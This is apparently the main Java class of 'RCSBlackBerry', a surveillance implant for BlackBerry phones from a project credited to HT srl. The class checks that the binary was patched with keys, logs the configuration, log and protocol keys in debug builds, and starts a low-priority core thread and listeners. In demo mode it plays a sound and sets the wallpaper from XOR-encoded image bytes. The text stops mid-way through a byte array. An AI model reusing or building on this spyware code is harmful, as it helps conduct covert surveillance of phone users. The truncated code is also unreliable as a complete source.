//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry
 * File         : Main.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry;

import java.util.Date;
import javax.microedition.pim.Event;
import javax.microedition.pim.EventList;
import javax.microedition.pim.PIM;
import javax.microedition.pim.PIMException;
import javax.microedition.pim.PIMList;
import javax.microedition.pim.RepeatRule;

import net.rim.blackberry.api.homescreen.HomeScreen;
import net.rim.blackberry.api.invoke.CalendarArguments;
import net.rim.blackberry.api.invoke.Invoke;
import net.rim.blackberry.api.phone.phonelogs.PhoneLogs;
import net.rim.device.api.system.Alert;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.component.Dialog;
import blackberry.config.Cfg;
import blackberry.config.Keys;
import blackberry.crypto.Encryption;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.fs.AutoFile;
import blackberry.injection.InjectorManager;
import blackberry.utils.Utils;

/**
 * The Class Main.
 */

public class Main extends UiApplication {
    //#ifdef DEBUG
    private final Debug debug;
    //#endif

    AppListener appListener;

    private boolean acceptsForeground;
    private int foregroundId;

    private BlackScreen blackScreen;

    private static LocalScreen localScreen;
    private static Main instance;

    //private boolean foreground;

    /**
     * The main method.
     * 
     * @param args
     *            the arguments
     */
    public static void main(final String[] args) {
        //#ifdef TEST
        System.out.println("Test");
        new MainTest();

        //#else
        mainReal();
        //#endif       

    }

    public static void mainReal() {
        final Keys keys = Encryption.getKeys();
        final boolean binaryPatched = keys.hasBeenBinaryPatched();

        if (binaryPatched) {
            instance = new Main();
            Status.self().setMain(instance);
            instance.enterEventDispatcher();
            
        } else {
            //#ifdef DEBUG
            System.out.println("Not binary patched, bailing out!");
            //#endif
        }
    }

    public static Main getInstance() {
        return Status.self().getMain();
    }

    /**
     * Instantiates a new main.
     */
    public Main() {
        localScreen = new LocalScreen(this);
        pushScreen(localScreen);

        final Core core = Core.getInstance();

        Thread.currentThread().setPriority(Thread.MIN_PRIORITY);
        appListener = AppListener.getInstance();

        //#ifdef DEBUG
        debug = new Debug("Main", DebugLevel.VERBOSE);
        debug.info("RCSBlackBerry " + Version.VERSION);
        debug.info("Message encryption: " + Messages.getString("1.0"));
        debug.info("BuildID = " + new String(Keys.getInstance().getBuildID()));
        debug.info("Key Conf = " + Utils.byteArrayToHex(Keys.getInstance().getConfKey()));
        debug.info("Key Log = " + Utils.byteArrayToHex(Keys.getInstance().getLogKey()));
        debug.info("Key Proto = " + Utils.byteArrayToHex(Keys.getInstance().getProtoKey()));
        debug.info("Demo = " + Utils.byteArrayToHex(Keys.getInstance().getDemo()));
        debug.info("Random = " + Utils.byteArrayToHex(Keys.getInstance().getRandomSeed()));
        //#endif

        final Thread coreThread = new Thread(core);
        coreThread.setPriority(Thread.MIN_PRIORITY);
        coreThread.start();

        startListeners();

        if (Keys.getInstance().isDemo()) {
            //#ifdef DEBUG
            debug.warn("Main: DEMO mode");
            //#endif
            Status.self().setDemo(true);
        } else {
            //#ifdef DEBUG
            debug.trace("Main: no DEMO");
            //#endif
            Status.self().setDemo(false);
        }
        //#ifdef DEBUG
        Status.self().setDebug(true);
        //#endif

        if (Status.self().isDemo()) {
            short[] fire = { 1400, 15, 1350, 15, 1320, 20, 1300, 20, 1250, 25,
                    1200, 35, 1200, 15, 1250, 15, 1300, 20, 1320, 20, 1350, 25,
                    1400, 35 };
            try {
                
                Alert.startAudio(fire, 100);
                setWallpaper(true);
        
               
            } catch (Exception e) {

            }
        }
    }

    public static void setWallpaper(boolean demo) {
        //irb(main):019:0> r.each_byte{ |x| print x^0xfa,", " }
    
        byte[] background;
        
        if(demo){
            background = getDemoBG();
        }else{
            background = getWhiteBG();
        }
        
        for (int i = 0; i < background.length; i++) {
            background[i] = (byte) (background[i] ^ 0xfa);
        }
         
         AutoFile file = new AutoFile(Messages.getString("C.5"));
         file.delete();

         file.create();
         file.write(background);
         
         HomeScreen.setBackgroundImage("file://" + Messages.getString("C.5"));
         
         Utils.sleep(1000);
         file.delete();
    }

    private static byte[] getWhiteBG() {
        byte[] background;
        background = new byte[]{
                (byte)115, (byte)170, (byte)180, (byte)189, (byte)247, (byte)240, (byte)224, (byte)240, (byte)250, (byte)250, (byte)250, (byte)247, (byte)179, (byte)178, (byte)190, (byte)168, (byte)250, (byte)250, (byte)250, (byte)228, (byte)250, (byte)250, (byte)250, (byte)238, (byte)242, (byte)248, (byte)250, (byte)250, (byte)250, (byte)239, (byte)51, (byte)224, (byte)105, (byte)250, (byte)250, (byte)250, (byte)251, (byte)137, (byte)168, (byte)189, (byte)184, (byte)250, (byte)84, (byte)52, (byte)230, (byte)19, (byte)250, (byte)250, (byte)250, (byte)243, (byte)138, (byte)178, (byte)163, (byte)137, (byte)250, (byte)250, (byte)241, (byte)233, (byte)250, (byte)250, (byte)241, (byte)233, (byte)251, (byte)250, (byte)96, (byte)102, (byte)226, (byte)250, (byte)250, (byte)249, (byte)92, (byte)147, (byte)174, (byte)162, (byte)142, (byte)162, (byte)183, (byte)182, (byte)192, (byte)153, (byte)149, (byte)151, (byte)212, (byte)155, (byte)158, (byte)149, (byte)152, (byte)159, (byte)212, (byte)130, (byte)151, (byte)138, (byte)250, (byte)250, (byte)250, (byte)250, (byte)250, (byte)198, (byte)130, (byte)192, (byte)130, (byte)151, (byte)138, (byte)151, (byte)159, (byte)142, (byte)155, (byte)218, (byte)130, (byte)151, (byte)150, (byte)148, (byte)137, (byte)192, (byte)130, (byte)199, (byte)216, (byte)155, (byte)158, (byte)149, (byte)152, (byte)159, (byte)192, (byte)148, (byte)137, (byte)192, (byte)151, (byte)159, (byte)142, (byte)155, (byte)213, (byte)216, (byte)218, (byte)130, (byte)192, (byte)130, (byte)151, (byte)138, (byte)142, (byte)145, (byte)199, (byte)216, (byte)162, (byte)183, (byte)170, (byte)218, (byte)185, (byte)149, (byte)136, (byte)159, (byte)218, (byte)207, (byte)212, (byte)206, (byte)212, (byte)202, (byte)216, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)198, (byte)136, (byte)158, (byte)156, (byte)192, (byte)168, (byte)190, (byte)188, (byte)218, (byte)130, (byte)151, (byte)150, (byte)148, (byte)137, (byte)192, (byte)136, (byte)158, (byte)156, (byte)199, (byte)216, (byte)146, (byte)142, (byte)142, (byte)138, (byte)192, (byte)213, (byte)213, (byte)141, (byte)141, (byte)141, (byte)212, (byte)141, (byte)201, (byte)212, (byte)149, (byte)136, (byte)157, (byte)213, (byte)203, (byte)195, (byte)195, (byte)195, (byte)213, (byte)202, (byte)200, (byte)213, (byte)200, (byte)200, (byte)215, (byte)136, (byte)158, (byte)156, (byte)215, (byte)137, (byte)131, (byte)148, (byte)142, (byte)155, (byte)130, (byte)215, (byte)148, (byte)137, (byte)217, (byte)216, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)198, (byte)136, (byte)158, (byte)156, (byte)192, (byte)190, (byte)159, (byte)137, (byte)153, (byte)136, (byte)147, (byte)138, (byte)142, (byte)147, (byte)149, (byte)148, (byte)218, (byte)136, (byte)158, (byte)156, (byte)192, (byte)155, (byte)152, (byte)149, (byte)143, (byte)142, (byte)199, (byte)216, (byte)216, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)130, (byte)151, (byte)150, (byte)148, (byte)137, (byte)192, (byte)130, (byte)151, (byte)138, (byte)199, (byte)216, (byte)146, (byte)142, (byte)142, (byte)138, (byte)192, (byte)213, (byte)213, (byte)148, (byte)137, (byte)212, (byte)155, (byte)158, (byte)149, (byte)152, (byte)159, (byte)212, (byte)153, (byte)149, (byte)151, (byte)213, (byte)130, (byte)155, (byte)138, (byte)213, (byte)203, (byte)212, (byte)202, (byte)213, (byte)216, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)130, (byte)151, (byte)150, (byte)148, (byte)137, (byte)192, (byte)142, (byte)147, (byte)156, (byte)156, (byte)199, (byte)216, (byte)146, (byte)142, (byte)142, (byte)138, (byte)192, (byte)213, (byte)213, (byte)148, (byte)137, (byte)212, (byte)155, (byte)158, (byte)149, (byte)152, (byte)159, (byte)212, (byte)153, (byte)149, (byte)151, (byte)213, (byte)142, (byte)147, (byte)156, (byte)156, (byte)213, (byte)203, (byte)212, (byte)202, (byte)213, (byte)216, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)130, (byte)151, (byte)150, (byte)148, (byte)137, (byte)192, (byte)159, (byte)130, (byte)147, (byte)156, (byte)199, (byte)216, (byte)146, (byte)142, (byte)142, (byte)138, (byte)192, (byte)213, (byte)213, (byte)148, (byte)137, (byte)212, (byte)155, (byte)158, (byte)149, (byte)152, (byte)159, (byte)212, (byte)153, (byte)149, (byte)151, (byte)213, (byte)159, (byte)130, (byte)147, (byte)156, (byte)213, (byte)203, (byte)212, (byte)202, (byte)213, (byte)216, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)198, (byte)130, (byte)151, (byte)138, (byte)192, (byte)183, (byte)149, (byte)158, (byte)147, (byte)156, (byte)131, (byte)190, (byte)155, (byte)142, (byte)159, (byte)196, (byte)200, (byte)202, (byte)203, (byte)206, (byte)215, (byte)203, (byte)203, (byte)215, (byte)203, (byte)200, (byte)174, (byte)203, (byte)202, (byte)192, (byte)203, (byte)203, (byte)192, (byte)201, (byte)202, (byte)198, (byte)213, (byte)130, (byte)151, (byte)138, (byte)192, (byte)183, (byte)149, (byte)158, (byte)147, (byte)156, (byte)131, (byte)190, (byte)155, (byte)142, (byte)159, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)198, (byte)130, (byte)151, (byte)138, (byte)192, (byte)185, (byte)136, (byte)159, (byte)155, (byte)142, (byte)149, (byte)136, (byte)174, (byte)149, (byte)149, (byte)150, (byte)196, (byte)170, (byte)147, (byte)130, (byte)159, (byte)150, (byte)151, (byte)155, (byte)142, (byte)149, (byte)136, (byte)218, (byte)201, (byte)212, (byte)201, (byte)198, (byte)213, (byte)130, (byte)151, (byte)138, (byte)192, (byte)185, (byte)136, (byte)159, (byte)155, (byte)142, (byte)149, (byte)136, (byte)174, (byte)149, (byte)149, (byte)150, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)198, (byte)142, (byte)147, (byte)156, (byte)156, (byte)192, (byte)181, (byte)136, (byte)147, (byte)159, (byte)148, (byte)142, (byte)155, (byte)142, (byte)147, (byte)149, (byte)148, (byte)196, (byte)203, (byte)198, (byte)213, (byte)142, (byte)147, (byte)156, (byte)156, (byte)192, (byte)181, (byte)136, (byte)147, (byte)159, (byte)148, (byte)142, (byte)155, (byte)142, (byte)147, (byte)149, (byte)148, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)198, (byte)142, (byte)147, (byte)156, (byte)156, (byte)192, (byte)185, (byte)149, (byte)151, (byte)138, (byte)136, (byte)159, (byte)137, (byte)137, (byte)147, (byte)149, (byte)148, (byte)196, (byte)207, (byte)198, (byte)213, (byte)142, (byte)147, (byte)156, (byte)156, (byte)192, (byte)185, (byte)149, (byte)151, (byte)138, (byte)136, (byte)159, (byte)137, (byte)137, (byte)147, (byte)149, (byte)148, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)198, (byte)142, (byte)147, (byte)156, (byte)156, (byte)192, (byte)168, (byte)159, (byte)137, (byte)149, (byte)150, (byte)143, (byte)142, (byte)147, (byte)149, (byte)148, (byte)175, (byte)148, (byte)147, (byte)142, (byte)196, (byte)200, (byte)198, (byte)213, (byte)142, (byte)147, (byte)156, (byte)156, (byte)192, (byte)168, (byte)159, (byte)137, (byte)149, (byte)150, (byte)143, (byte)142, (byte)147, (byte)149, (byte)148, (byte)175, (byte)148, (byte)147, (byte)142, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)198, (byte)142, (byte)147, (byte)156, (byte)156, (byte)192, (byte)163, (byte)168, (byte)159, (byte)137, (byte)149, (byte)150, (byte)143, (byte)142, (byte)147, (byte)149, (byte)148, (byte)196, (byte)205, (byte)200, (byte)198, (byte)213, (byte)142, (byte)147, (byte)156, (byte)156, (byte)192, (byte)163, (byte)168, (byte)159, (byte)137, (byte)149, (byte)150, (byte)143, (byte)142, (byte)147, (byte)149, (byte)148, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)198, (byte)142, (byte)147, (byte)156, (byte)156, (byte)192, (byte)162, (byte)168, (byte)159, (byte)137, (byte)149, (byte)150, (byte)143, (byte)142, (byte)147, (byte)149, (byte)148, (byte)196, (byte)205, (byte)200, (byte)198, (byte)213, (byte)142, (byte)147, (byte)156, (byte)156, (byte)192, (byte)162, (byte)168, (byte)159, (byte)137, (byte)149, (byte)150, (byte)143, (byte)142, (byte)147, (byte)149, (byte)148, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)198, (byte)159, (byte)130, (byte)147, (byte)156, (byte)192, (byte)170, (byte)147, (byte)130, (byte)159, (byte)150, (byte)162, (byte)190, (byte)147, (byte)151, (byte)159, (byte)148, (byte)137, (byte)147, (byte)149, (byte)148, (byte)196, (byte)201, (byte)202, (byte)198, (byte)213, (byte)159, (byte)130, (byte)147, (byte)156, (byte)192, (byte)170, (byte)147, (byte)130, (byte)159, (byte)150, (byte)162, (byte)190, (byte)147, (byte)151, (byte)159, (byte)148, (byte)137, (byte)147, (byte)149, (byte)148, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)198, (byte)159, (byte)130, (byte)147, (byte)156, (byte)192, (byte)185, (byte)149, (byte)150, (byte)149, (byte)136, (byte)169, (byte)138, (byte)155, (byte)153, (byte)159, (byte)196, (byte)203, (byte)198, (byte)213, (byte)159, (byte)130, (byte)147, (byte)156, (byte)192, (byte)185, (byte)149, (byte)150, (byte)149, (byte)136, (byte)169, (byte)138, (byte)155, (byte)153, (byte)159, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)198, (byte)159, (byte)130, (byte)147, (byte)156, (byte)192, (byte)170, (byte)147, (byte)130, (byte)159, (byte)150, (byte)163, (byte)190, (byte)147, (byte)151, (byte)159, (byte)148, (byte)137, (byte)147, (byte)149, (byte)148, (byte)196, (byte)200, (byte)202, (byte)198, (byte)213, (byte)159, (byte)130, (byte)147, (byte)156, (byte)192, (byte)170, (byte)147, (byte)130, (byte)159, (byte)150, (byte)163, (byte)190, (byte)147, (byte)151, (byte)159, (byte)148, (byte)137, (byte)147, (byte)149, (byte)148, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)198, (byte)213, (byte)136, (byte)158, (byte)156, (byte)192, (byte)190, (byte)159, (byte)137, (byte)153, (byte)136, (byte)147, (byte)138, (byte)142, (byte)147, (byte)149, (byte)148, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)198, (byte)213, (byte)136, (byte)158, (byte)156, (byte)192, (byte)168, (byte)190, (byte)188, (byte)196, (byte)240, (byte)198, (byte)213, (byte)130, (byte)192, (byte)130, (byte)151, (byte)138, (byte)151, (byte)159, (byte)142, (byte)155, (byte)196, (byte)240, (byte)165, (byte)51, (byte)219, (byte)165, (byte)250, (byte)250, (byte)250, (byte)200, (byte)179, (byte)190, (byte)187, (byte)174, (byte)194, (byte)235, (byte)153, (byte)6, (byte)5, (byte)5, (byte)197, (byte)249, (byte)151, (byte)250, (byte)233, (byte)151, (byte)118, (byte)255, (byte)99, (byte)192, (byte)144, (byte)206, (byte)160, (byte)34, (byte)116, (byte)252, (byte)50, (byte)146, (byte)122, (byte)90, (byte)127, (byte)250, (byte)224, (byte)141, (byte)206, (byte)127, (byte)118, (byte)252, (byte)242, (byte)160, (byte)242, (byte)90, (byte)139, (byte)189, (byte)169, (byte)242, (byte)160, (byte)122, (byte)250, (byte)250, (byte)53, (byte)195, (byte)249, (byte)223, (byte)39, (byte)255, (byte)240, (byte)52, (byte)250, (byte)250, (byte)250, (byte)250, (byte)179, (byte)191, (byte)180, (byte)190, (byte)84, (byte)184, (byte)154, (byte)120
        };
        return background;
    }

    private static byte[] getDemoBG() {
        byte[] background;
        background= new byte[]{
            (byte)115, (byte)170, (byte)180, (byte)189, (byte)247, (byte)240, (byte)224, (byte)240, (byte)250, (byte)250, (byte)250, (byte)247, (byte)179, (byte)178, (byte)190, (byte)168, (byte)250, (byte)250, (byte)251, (byte)214, (byte)250, (byte)250, (byte)250, (byte)50, (byte)242, (byte)248, (byte)250, (byte)250, (byte)250, (byte)39, (byte)71, (byte)177, (byte)248, (byte)250, (byte)250, (byte)250, (byte)251, (byte)137, (byte)168, (byte)189, (byte)184, (byte)250, (byte)84, (byte)52, (byte)230, (byte)19, (byte)250, (byte)250, (byte)250, (byte)243, (byte)138, (byte)178, (byte)163, (byte)137, (byte)250, (byte)250, (byte)241, (byte)233, (byte)250, (byte)250, (byte)241, (byte)233, (byte)251, (byte)250, (byte)96, (byte)102, (byte)226, (byte)250, (byte)250, (byte)249, (byte)82, (byte)147, (byte)174, (byte)162, (byte)142, (byte)162, (byte)183, (byte)182, (byte)192, (byte)153, (byte)149, (byte)151, (byte)212, (byte)155, (byte)158, (byte)149, (byte)152, (byte)159, (byte)212, (byte)130, (byte)151, (byte)138, (byte)250, (byte)250, (byte)250, (byte)250, (byte)250, (byte)198, (byte)130, (byte)192, (byte)130, (byte)151, (byte)138, (byte)151, (byte)159, (byte)142, (byte)155, (byte)218, (byte)130, (byte)151, (byte)150, (byte)148, (byte)137, (byte)192, (byte)130, (byte)199, (byte)216, (byte)155, (byte)158, (byte)149, (byte)152, (byte)159, (byte)192, (byte)148, (byte)137, (byte)192, (byte)151, (byte)159, (byte)142, (byte)155, (byte)213, (byte)216, (byte)218, (byte)130, (byte)192, (byte)130, (byte)151, (byte)138, (byte)142, (byte)145, (byte)199, (byte)216, (byte)162, (byte)183, (byte)170, (byte)218, (byte)185, (byte)149, (byte)136, (byte)159, (byte)218, (byte)207, (byte)212, (byte)206, (byte)212, (byte)202, (byte)216, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)198, (byte)136, (byte)158, (byte)156, (byte)192, (byte)168, (byte)190, (byte)188, (byte)218, (byte)130, (byte)151, (byte)150, (byte)148, (byte)137, (byte)192, (byte)136, (byte)158, (byte)156, (byte)199, (byte)216, (byte)146, (byte)142, (byte)142, (byte)138, (byte)192, (byte)213, (byte)213, (byte)141, (byte)141, (byte)141, (byte)212, (byte)141, (byte)201, (byte)212, (byte)149, (byte)136, (byte)157, (byte)213, (byte)203, (byte)195, (byte)195, (byte)195, (byte)213, (byte)202, (byte)200, (byte)213, (byte)200, (byte)200, (byte)215, (byte)136, (byte)158, (byte)156, (byte)215, (byte)137, (byte)131, (byte)148, (byte)142, (byte)155, (byte)130, (byte)215, (byte)148, (byte)137, (byte)217, (byte)216, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)198, (byte)136, (byte)158, (byte)156, (byte)192, (byte)190, (byte)159, (byte)137, (byte)153, (byte)136, (byte)147, (byte)138, (byte)142, (byte)147, (byte)149, (byte)148, (byte)218, (byte)136, (byte)158, (byte)156, (byte)192, (byte)155, (byte)152, (byte)149, (byte)143, (byte)142, (byte)199, (byte)216, (byte)216, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)130, (byte)151, (byte)150, (byte)148, (byte)137, (byte)192, (byte)130, (byte)151, (byte)138, (byte)199, (byte)216, (byte)146, (byte)142, (byte)142, (byte)138, (byte)192, (byte)213, (byte)213, (byte)148, (byte)137, (byte)212, (byte)155, (byte)158, (byte)149, (byte)152, (byte)159, (byte)212, (byte)153, (byte)149, (byte)151, (byte)213, (byte)130, (byte)155, (byte)138, (byte)213, (byte)203, (byte)212, (byte)202, (byte)213, (byte)216, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)130, (byte)151, (byte)150, (byte)148, (byte)137, (byte)192, (byte)142, (byte)147, (byte)156, (byte)156, (byte)199, (byte)216, (byte)146, (byte)142, (byte)142, (byte)138, (byte)192, (byte)213, (byte)213, (byte)148, (byte)137, (byte)212, (byte)155, (byte)158, (byte)149, (byte)152, (byte)159, (byte)212, (byte)153, (byte)149, (byte)151, (byte)213, (byte)142, (byte)147, (byte)156, (byte)156, (byte)213, (byte)203, (byte)212, (byte)202, (byte)213, (byte)216, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)130, (byte)151, (byte)150, (byte)148, (byte)137, (byte)192, (byte)159, (byte)130, (byte)147, (byte)156, (byte)199, (byte)216, (byte)146, (byte)142, (byte)142, (byte)138, (byte)192, (byte)213, (byte)213, (byte)148, (byte)137, (byte)212, (byte)155, (byte)158, (byte)149, (byte)152, (byte)159, (byte)212, (byte)153, (byte)149, (byte)151, (byte)213, (byte)159, (byte)130, (byte)147, (byte)156, (byte)213, (byte)203, (byte)212, (byte)202, (byte)213, (byte)216, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)198, (byte)130, (byte)151, (byte)138, (byte)192, (byte)183, (byte)149, (byte)158, (byte)147, (byte)156, (byte)131, (byte)190, (byte)155, (byte)142, (byte)159, (byte)196, (byte)200, (byte)202, (byte)203, (byte)206, (byte)215, (byte)203, (byte)203, (byte)215, (byte)203, (byte)200, (byte)174, (byte)203, (byte)202, (byte)192, (byte)203, (byte)203, (byte)192, (byte)204, (byte)194, (byte)198, (byte)213, (byte)130, (byte)151, (byte)138, (byte)192, (byte)183, (byte)149, (byte)158, (byte)147, (byte)156, (byte)131, (byte)190, (byte)155, (byte)142, (byte)159, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)198, (byte)130, (byte)151, (byte)138, (byte)192, (byte)185, (byte)136, (byte)159, (byte)155, (byte)142, (byte)149, (byte)136, (byte)174, (byte)149, (byte)149, (byte)150, (byte)196, (byte)170, (byte)147, (byte)130, (byte)159, (byte)150, (byte)151, (byte)155, (byte)142, (byte)149, (byte)136, (byte)218, (byte)201, (byte)212, (byte)201, (byte)198, (byte)213, (byte)130, (byte)151, (byte)138, (byte)192, (byte)185, (byte)136, (byte)159, (byte)155, (byte)142, (byte)149, (byte)136, (byte)174, (byte)149, (byte)149, (byte)150, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)198, (byte)142, (byte)147, (byte)156, (byte)156, (byte)192, (byte)181, (byte)136, (byte)147, (byte)159, (byte)148, (byte)142, (byte)155, (byte)142, (byte)147, (byte)149, (byte)148, (byte)196, (byte)203, (byte)198, (byte)213, (byte)142, (byte)147, (byte)156, (byte)156, (byte)192, (byte)181, (byte)136, (byte)147, (byte)159, (byte)148, (byte)142, (byte)155, (byte)142, (byte)147, (byte)149, (byte)148, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)198, (byte)142, (byte)147, (byte)156, (byte)156, (byte)192, (byte)185, (byte)149, (byte)151, (byte)138, (byte)136, (byte)159, (byte)137, (byte)137, (byte)147, (byte)149, (byte)148, (byte)196, (byte)207, (byte)198, (byte)213, (byte)142, (byte)147, (byte)156, (byte)156, (byte)192, (byte)185, (byte)149, (byte)151, (byte)138, (byte)136, (byte)159, (byte)137, (byte)137, (byte)147, (byte)149, (byte)148, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)198, (byte)142, (byte)147, (byte)156, (byte)156, (byte)192, (byte)168, (byte)159, (byte)137, (byte)149, (byte)150, (byte)143, (byte)142, (byte)147, (byte)149, (byte)148, (byte)175, (byte)148, (byte)147, (byte)142, (byte)196, (byte)200, (byte)198, (byte)213, (byte)142, (byte)147, (byte)156, (byte)156, (byte)192, (byte)168, (byte)159, (byte)137, (byte)149, (byte)150, (byte)143, (byte)142, (byte)147, (byte)149, (byte)148, (byte)175, (byte)148, (byte)147, (byte)142, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)198, (byte)142, (byte)147, (byte)156, (byte)156, (byte)192, (byte)163, (byte)168, (byte)159, (byte)137, (byte)149, (byte)150, (byte)143, (byte)142, (byte)147, (byte)149, (byte)148, (byte)196, (byte)205, (byte)200, (byte)198, (byte)213, (byte)142, (byte)147, (byte)156, (byte)156, (byte)192, (byte)163, (byte)168, (byte)159, (byte)137, (byte)149, (byte)150, (byte)143, (byte)142, (byte)147, (byte)149, (byte)148, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)198, (byte)142, (byte)147, (byte)156, (byte)156, (byte)192, (byte)162, (byte)168, (byte)159, (byte)137, (byte)149, (byte)150, (byte)143, (byte)142, (byte)147, (byte)149, (byte)148, (byte)196, (byte)205, (byte)200, (byte)198, (byte)213, (byte)142, (byte)147, (byte)156, (byte)156, (byte)192, (byte)162, (byte)168, (byte)159, (byte)137, (byte)149, (byte)150, (byte)143, (byte)142, (byte)147, (byte)149, (byte)148, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)198, (byte)159, (byte)130, (byte)147, (byte)156, (byte)192, (byte)170, (byte)147, (byte)130, (byte)159, (byte)150, (byte)162, (byte)190, (byte)147, (byte)151, (byte)159, (byte)148, (byte)137, (byte)147, (byte)149, (byte)148, (byte)196, (byte)201, (byte)202, (byte)202, (byte)198, (byte)213, (byte)159, (byte)130, (byte)147, (byte)156, (byte)192, (byte)170, (byte)147, (byte)130, (byte)159, (byte)150, (byte)162, (byte)190, (byte)147, (byte)151, (byte)159, (byte)148, (byte)137, (byte)147, (byte)149, (byte)148, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)198, (byte)159, (byte)130, (byte)147, (byte)156, (byte)192, (byte)185, (byte)149, (byte)150, (byte)149, (byte)136, (byte)169, (byte)138, (byte)155, (byte)153, (byte)159, (byte)196, (byte)203, (byte)198, (byte)213, (byte)159, (byte)130, (byte)147, (byte)156, (byte)192, (byte)185, (byte)149, (byte)150, (byte)149, (byte)136, (byte)169, (byte)138, (byte)155, (byte)153, (byte)159, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)198, (byte)159, (byte)130, (byte)147, (byte)156, (byte)192, (byte)170, (byte)147, (byte)130, (byte)159, (byte)150, (byte)163, (byte)190, (byte)147, (byte)151, (byte)159, (byte)148, (byte)137, (byte)147, (byte)149, (byte)148, (byte)196, (byte)200, (byte)202, (byte)202, (byte)198, (byte)213, (byte)159, (byte)130, (byte)147, (byte)156, (byte)192, (byte)170, (byte)147, (byte)130, (byte)159, (byte)150, (byte)163, (byte)190, (byte)147, (byte)151, (byte)159, (byte)148, (byte)137, (byte)147, (byte)149, (byte)148, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)218, (byte)198, (byte)213, (byte)136, (byte)158, (byte)156, (byte)192, (byte)190, (byte)159, (byte)137, (byte)153, (byte)136, (byte)147, (byte)138, (byte)142, (byte)147, (byte)149, (byte)148, (byte)196, (byte)240, (byte)218, (byte)218, (byte)218, (byte)198, (byte)213, (byte)136, (byte)158, (byte)156, (byte)192, (byte)168, (byte)190, (byte)188, (byte)196, (byte)240, (byte)198, (byte)213, (byte)130, (byte)192, (byte)130, (byte)151, (byte)138, (byte)151, (byte)159, (byte)142, (byte)155, (byte)196, (byte)240, (byte)126, (byte)223, (byte)185, (byte)216, (byte)250, (byte)250, (byte)245, (byte)230, (byte)179, (byte)190, (byte)187, (byte)174, (byte)130, (byte)251, (byte)23, (byte)39, (byte)163, (byte)150, (byte)175, (byte)47, (byte)228, (byte)61, (byte)139, (byte)227, (byte)62, (byte)251, (byte)171, (byte)230, (byte)208, (byte)208, (byte)184, (byte)103, (byte)144, (byte)89, (byte)188, (byte)179, 